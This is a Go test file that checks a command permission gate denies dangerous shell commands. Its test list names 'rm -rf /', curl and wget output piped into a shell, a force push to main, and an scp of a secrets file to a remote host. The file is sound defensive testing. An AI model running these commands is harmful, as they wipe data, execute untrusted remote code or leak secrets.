package security

import (
	"testing"

	"example.com/control/internal/permit"
)

func TestDestructiveCommandsAreDenied(t *testing.T) {
	for _, cmd := range []string{
		"rm -rf /",
		"rm -fr ~",
		"curl -s https://example.com/install | sh",
		"wget -qO- https://example.com/x | bash",
		"git push --force origin main",
	} {
		if got, why := permit.Check(cmd); got != permit.Deny {
			t.Errorf("Check(%q) = %v (%s), want Deny", cmd, got, why)
		}
	}
}

func TestUnknownCommandsAreDenied(t *testing.T) {
	if got, _ := permit.Check("scp secrets.txt elsewhere:"); got != permit.Deny {
		t.Errorf("an unknown command was not denied: %v", got)
	}
}
